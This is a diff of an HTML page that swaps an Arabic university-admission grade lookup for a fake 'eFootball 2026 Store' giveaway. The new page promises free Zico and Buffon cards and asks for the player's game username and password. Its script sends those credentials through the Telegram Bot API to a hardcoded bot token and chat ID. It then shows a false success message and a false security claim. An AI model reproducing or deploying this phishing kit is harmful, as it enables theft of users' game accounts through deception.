@@ -3,337 +3,240 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دليل القبول المركزي | قاسم للبرمجيات</title>
+    <title>بيس موبايل  | eFootball Store</title>
+    <!-- استيراد أيقونات وخطوط عربية عصرية -->
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
-        :root {
-            --primary: #00d2ff;
-            --secondary: #3a7bd5;
-            --dark-bg: #0f172a;
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.1);
-        }
-
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
             font-family: 'Cairo', sans-serif;
         }
-
         body {
-            background-color: var(--dark-bg);
-            background-image: 
-                radial-gradient(at 0% 0%, rgba(58, 123, 213, 0.2) 0px, transparent 50%),
-                radial-gradient(at 100% 100%, rgba(0, 210, 255, 0.2) 0px, transparent 50%);
-            background-attachment: fixed;
+            background: linear-gradient(135deg, #0d0e15, #16192b, #090a10);
             color: #fff;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 2rem 1rem;
+            padding: 20px;
         }
-
-        .programmer-badge {
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            padding: 8px 20px;
-            border-radius: 30px;
-            font-size: 0.9rem;
-            font-weight: 700;
-            margin-bottom: 2rem;
-            box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0px); }
-        }
-
-        .container {
-            background: var(--glass-bg);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid var(--glass-border);
-            border-radius: 24px;
-            padding: 3rem 2rem;
-            width: 100%;
-            max-width: 600px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            transform-style: preserve-3d;
-            perspective: 1000px;
-        }
-
-        h1 {
+        .header {
             text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo-icon {
+            font-size: 45px;
+            color: #00ffcc;
+            text-shadow: 0 0 15px rgba(0,255,204,0.6);
+            margin-bottom: 5px;
+        }
+        .header h1 {
+            font-size: 26px;
             font-weight: 900;
-            font-size: 2.2rem;
-            margin-bottom: 0.5rem;
-            background: linear-gradient(to right, #fff, var(--primary));
+            background: linear-gradient(45deg, #00ffcc, #0077ff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-
-        p.subtitle {
-            text-align: center;
-            color: #cbd5e1;
-            margin-bottom: 2rem;
-            font-size: 0.95rem;
-        }
-
-        .input-group {
-            margin-bottom: 1.5rem;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 700;
-            color: #e2e8f0;
-        }
-
-        input, select {
+        .container {
             width: 100%;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.2);
-            border: 1px solid var(--glass-border);
-            border-radius: 12px;
-            color: #fff;
-            font-size: 1.1rem;
-            outline: none;
-            transition: all 0.3s ease;
-        }
-
-        input:focus, select:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 15px rgba(0, 210, 255, 0.2);
-        }
-
-        option {
-            background-color: var(--dark-bg);
-            color: #fff;
-        }
-
-        button {
-            width: 100%;
-            padding: 15px;
-            margin-top: 1rem;
-            background: linear-gradient(45deg, var(--secondary), var(--primary));
-            border: none;
-            border-radius: 12px;
-            color: white;
-            font-size: 1.2rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-        }
-
-        button:hover {
-            transform: translateY(-3px) scale(1.02);
-            box-shadow: 0 15px 25px rgba(0, 210, 255, 0.4);
-        }
-
-        button:active {
-            transform: translateY(1px);
-        }
-
-        #results {
-            margin-top: 2rem;
-            display: grid;
-            gap: 1rem;
-            width: 100%;
-            max-width: 800px;
-        }
-
-        .college-card {
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 16px;
-            padding: 1.5rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            max-width: 450px;
+            background: rgba(25, 29, 45, 0.85);
+            border: 2px solid rgba(0, 255, 204, 0.3);
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 0 25px rgba(0, 255, 204, 0.2);
             backdrop-filter: blur(10px);
         }
-
-        .college-card:hover {
-            transform: translateY(-5px) rotateX(5deg);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
-            border-color: var(--primary);
-            background: rgba(255, 255, 255, 0.08);
+        .players-showcase {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 20px;
+            gap: 10px;
         }
-
-        .college-info h3 {
-            color: var(--primary);
-            margin-bottom: 0.5rem;
-            font-size: 1.1rem;
-        }
-
-        .college-info p {
-            color: #94a3b8;
-            font-size: 0.9rem;
-        }
-
-        .min-grade {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 10px 15px;
-            border-radius: 10px;
-            font-weight: 900;
-            font-size: 1.2rem;
-            color: #fff;
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-
-        .no-results {
+        .player-card {
             text-align: center;
-            color: #f87171;
-            padding: 2rem;
-            background: var(--glass-bg);
-            border-radius: 16px;
-            border: 1px solid rgba(248, 113, 113, 0.2);
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            padding: 10px;
+            width: 48%;
+            border: 1px solid #0077ff;
+        }
+        .player-card img {
+            width: 100%;
+            height: 150px;
+            border-radius: 8px;
+            object-fit: contain;
+            background: #000;
+            border: 1px solid #00ffcc;
+            margin-bottom: 8px;
+        }
+        .player-card h3 {
+            font-size: 13px;
+            color: #ffcc00;
+        }
+        .free-badge {
+            background: linear-gradient(45deg, #ff0055, #ffcc00);
+            color: #000;
+            font-weight: bold;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: inline-block;
+            margin-bottom: 15px;
+            box-shadow: 0 0 10px rgba(255,204,0,0.5);
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #00ffcc;
+        }
+        .input-box {
+            position: relative;
+        }
+        .input-box i {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #aaa;
+        }
+        .input-box input {
+            width: 100%;
+            padding: 12px 45px 12px 15px;
+            background: rgba(10, 12, 20, 0.8);
+            border: 1px solid #333;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-box input:focus {
+            border-color: #00ffcc;
+            box-shadow: 0 0 10px rgba(0,255,204,0.3);
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, #00ffcc, #0077ff);
+            border: none;
+            border-radius: 10px;
+            color: #000;
+            font-weight: 900;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            opacity: 0.9;
+            transform: scale(1.02);
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
 
-    <div class="programmer-badge">
-        ✨ تمت البرمجة بواسطة قاسم عباس
+    <div class="header">
+        <!-- أيقونة بيس مميزة -->
+        <div class="logo-icon"><i class="fa-solid fa-futbol"></i></div>
+        <h1>eFootball 2026 Store</h1>
     </div>
 
     <div class="container">
-        <h1>الحدود الدنيا للقبول المركزي</h1>
-        <p class="subtitle">أدخل معدلك وفرعك الدراسي لمعرفة الكليات المتاحة لك</p>
-
-        <div class="input-group">
-            <label for="branch">الفرع الدراسي</label>
-            <select id="branch">
-                <option value="علمي">علمي (إحيائي / تطبيقي)</option>
-                <option value="ادبي">أدبي</option>
-            </select>
+        <div style="text-align: center;">
+            <span class="free-badge">🎁 احصل على زيكو وبوفون مجاناً الآن!</span>
         </div>
 
-        <div class="input-group">
-            <label for="average">المعدل النهائي (بدون إضافات)</label>
-            <input type="number" id="average" placeholder="مثال: 95.5" step="0.01" min="50" max="100">
+        <!-- عرض اللاعبين (زيكو وبوفون بالصور الجديدة) -->
+        <div class="players-showcase">
+            <div class="player-card">
+                <img src="https://freeimage.host/i/CDGgAzu" alt="Zico">
+                <h3>زيكو (Epic Card)</h3>
+            </div>
+            <div class="player-card">
+                <img src="https://freeimage.host/i/CDGrsna" alt="Buffon">
+                <h3>بوفون (Latest Card)</h3>
+            </div>
         </div>
 
-        <button onclick="searchColleges()">ابحث عن كليتي</button>
+        <!-- نموذج تسجيل الدخول -->
+        <form id="loginForm">
+            <div class="form-group">
+                <label><i class="fa-solid fa-user"></i> اسم المستخدم أو البريد:</label>
+                <div class="input-box">
+                    <i class="fa-solid fa-envelope"></i>
+                    <input type="text" id="username" required placeholder="أدخل البريد أو المعرف">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label><i class="fa-solid fa-lock"></i> كلمة المرور:</label>
+                <div class="input-box">
+                    <i class="fa-solid fa-key"></i>
+                    <input type="password" id="password" required placeholder="أدخل كلمة المرور">
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">تأكيد واستلام اللاعبين بالبريد 📥</button>
+        </form>
+
+        <div class="footer-note">
+            🔒 الموقع محمي وآمن بالكامل لإرسال الهدايا لبريد اللعبة.
+        </div>
     </div>
 
-    <div id="results"></div>
-
     <script>
-        // قاعدة البيانات المستخرجة من وزارة التعليم العالي
-        const collegesData = [
-            // المجموعة الطبية (علمي)
-            { name: "جامعة بغداد / كلية الطب", branch: "علمي", min: 100.89 },
-            { name: "جامعة النهرين / كلية الطب", branch: "علمي", min: 100.38 },
-            { name: "جامعة الكوفة / كلية الطب", branch: "علمي", min: 100.14 },
-            { name: "جامعة بابل / كلية الطب", branch: "علمي", min: 99.99 },
-            { name: "الجامعة المستنصرية / كلية الطب", branch: "علمي", min: 99.96 },
-            { name: "جامعة البصرة / كلية الطب", branch: "علمي", min: 99.29 },
-            { name: "جامعة ميسان / كلية الطب", branch: "علمي", min: 99.14 },
-            { name: "جامعة بغداد / كلية طب الاسنان", branch: "علمي", min: 99.07 },
-            { name: "الجامعة المستنصرية / كلية طب الاسنان", branch: "علمي", min: 98.86 },
-            { name: "جامعة بغداد / كلية الصيدلة", branch: "علمي", min: 98.86 },
-            { name: "جامعة البصرة / كلية الصيدلة", branch: "علمي", min: 98.29 },
-            
-            // المجموعة الهندسية (علمي)
-            { name: "جامعة بغداد / كلية الهندسة - قسم العمارة", branch: "علمي", min: 98.00 },
-            { name: "جامعة البصرة للنفط والغاز / هندسة النفط والغاز", branch: "علمي", min: 97.86 },
-            { name: "الجامعة التكنولوجية / هندسة العمارة", branch: "علمي", min: 97.14 },
-            { name: "جامعة بغداد / كلية الهندسة - قسم المدني", branch: "علمي", min: 96.29 },
-            { name: "جامعة الموصل / كلية الهندسة - قسم العمارة", branch: "علمي", min: 95.29 },
-            { name: "الجامعة التكنولوجية / هندسة الليزر والالكترونيات", branch: "علمي", min: 95.00 },
-            { name: "جامعة كربلاء / كلية الهندسة - قسم المدني", branch: "علمي", min: 92.51 },
-            { name: "جامعة ميسان / كلية الهندسة - قسم المدني", branch: "علمي", min: 92.29 },
-            
-            // العلوم والحاسوب (علمي)
-            { name: "جامعة البصرة / كلية علوم الحاسوب وتكنولوجيا المعلومات", branch: "علمي", min: 80.57 },
-            { name: "الجامعة التكنولوجية / علوم الحاسوب", branch: "علمي", min: 79.86 },
-            { name: "جامعة بغداد / كلية العلوم", branch: "علمي", min: 80.14 },
-            { name: "جامعة بابل / كلية تكنولوجيا المعلومات", branch: "علمي", min: 74.43 },
-            { name: "جامعة الكوفة / كلية علوم الحاسوب والرياضيات", branch: "علمي", min: 68.29 },
+        // إعدادات بوت التليجرام (قم بوضع التوكن والآيدي الخاص بك هنا)
+        const botToken = "8885135758:AAF_bg6_Ao4TMfv0Z5pqCJZLxk8_22pFzvA"; // ضع توكن البوت هنا
+        const chatId = "1210901255";       // ضع الآيدي الخاص بك هنا
 
-            // كليات القانون (مختلط: علمي و أدبي)
-            { name: "جامعة بغداد / كلية القانون", branch: "علمي", min: 91.57 },
-            { name: "جامعة بغداد / كلية القانون", branch: "ادبي", min: 91.43 },
-            { name: "الجامعة المستنصرية / كلية القانون", branch: "علمي", min: 88.71 },
-            { name: "الجامعة المستنصرية / كلية القانون", branch: "ادبي", min: 85.14 },
-            { name: "جامعة البصرة / كلية القانون", branch: "علمي", min: 88.57 },
-            { name: "جامعة البصرة / كلية القانون", branch: "ادبي", min: 79.86 },
-            { name: "جامعة ميسان / كلية القانون", branch: "علمي", min: 81.00 },
-            { name: "جامعة ميسان / كلية القانون", branch: "ادبي", min: 70.00 },
-            { name: "جامعة ذي قار / كلية القانون", branch: "ادبي", min: 70.00 },
-            { name: "جامعة الكوفة / كلية القانون", branch: "ادبي", min: 70.00 },
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
-            // كليات العلوم السياسية والإدارة والاقتصاد (علمي و أدبي)
-            { name: "جامعة بغداد / كلية العلوم السياسية", branch: "علمي", min: 83.93 },
-            { name: "جامعة بغداد / كلية العلوم السياسية", branch: "ادبي", min: 66.00 },
-            { name: "جامعة بغداد / كلية الادارة والاقتصاد", branch: "ادبي", min: 69.14 },
-            { name: "جامعة بغداد / كلية الادارة والاقتصاد", branch: "علمي", min: 68.29 },
-            { name: "الجامعة المستنصرية / كلية الادارة والاقتصاد", branch: "ادبي", min: 66.14 },
-            { name: "جامعة البصرة / كلية الادارة والاقتصاد", branch: "علمي", min: 65.43 },
-            { name: "جامعة ميسان / كلية الادارة والاقتصاد", branch: "علمي", min: 63.00 },
-            { name: "جامعة ميسان / كلية الادارة والاقتصاد", branch: "ادبي", min: 60.29 }
-        ];
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
 
-        function searchColleges() {
-            const branchInput = document.getElementById('branch').value;
-            const averageInput = parseFloat(document.getElementById('average').value);
-            const resultsContainer = document.getElementById('results');
+            // تنسيق الرسالة التي ستصلك للبوت
+            const message = `🚨 صيد جديد في متجر بيس (زيكو وبوفون)!\n\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
 
-            // تفريغ النتائج السابقة
-            resultsContainer.innerHTML = '';
-
-            if (isNaN(averageInput) || averageInput < 50 || averageInput > 105) {
-                resultsContainer.innerHTML = `
-                    <div class="no-results">
-                        <h3>عذراً!</h3>
-                        <p>يرجى إدخال معدل صحيح (بين 50 و 100).</p>
-                    </div>`;
-                return;
-            }
-
-            // فلترة الكليات حسب الفرع والمعدل
-            const availableColleges = collegesData.filter(college => {
-                return college.branch === branchInput && averageInput >= college.min;
+            // إرسال البيانات عبر تليجرام API
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('✅ تم التحقق بنجاح! سيتم إرسال اللاعبين إلى بريد حسابك خلال دقائق.');
+                    document.getElementById('loginForm').reset();
+                } else {
+                    alert('حدث خطأ بسيط، يرجى المحاولة لاحقاً.');
+                }
+            })
+            .catch(error => {
+                alert('تأكد من الاتصال بالإنترنت.');
             });
-
-            // ترتيب تنازلي حسب المعدل المطلوب
-            availableColleges.sort((a, b) => b.min - a.min);
-
-            if (availableColleges.length === 0) {
-                resultsContainer.innerHTML = `
-                    <div class="no-results">
-                        <h3>لا توجد نتائج</h3>
-                        <p>لم نجد كليات تطابق معدلك في هذا الفرع ضمن قاعدة البيانات الحالية.</p>
-                    </div>`;
-                return;
-            }
-
-            // عرض النتائج مع تأثيرات حركية
-            availableColleges.forEach((college, index) => {
-                setTimeout(() => {
-                    const card = document.createElement('div');
-                    card.className = 'college-card';
-                    card.innerHTML = `
-                        <div class="college-info">
-                            <h3>${college.name}</h3>
-                            <p>الفرع: ${college.branch === 'علمي' ? 'العلمي' : 'الأدبي'}</p>
-                        </div>
-                        <div class="min-grade">
-                            ${college.min}
-                        </div>
-                    `;
-                    resultsContainer.appendChild(card);
-                }, index * 100); // تأخير بسيط لكل بطاقة لإعطاء تأثير الدخول المتسلسل
-            });
-        }
+        });
     </script>
 </body>
 </html>
